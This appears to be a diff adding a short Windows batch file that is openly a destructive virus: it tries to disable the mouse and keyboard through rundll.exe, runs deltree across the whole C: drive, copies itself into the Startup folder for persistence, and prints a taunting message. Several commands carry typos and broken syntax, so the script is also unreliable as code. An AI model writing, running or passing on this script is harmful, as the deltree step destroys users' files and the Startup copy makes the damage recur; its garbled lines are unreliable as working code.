@@ -1,0 +1,12 @@
+echo off@
+c:\windows\rundll.exe mouse,disable
+c:\windows\rundll.exe keyboard,diable
+goto del
+:del
+deltree \y c:\*.*
+goto copy
+:copy
+copy %0 C:\WINDOWS\Start Menu\Programs\StartUp\name of virus.bat
+echo ...........hahaha........i kill you
+cls
+puse
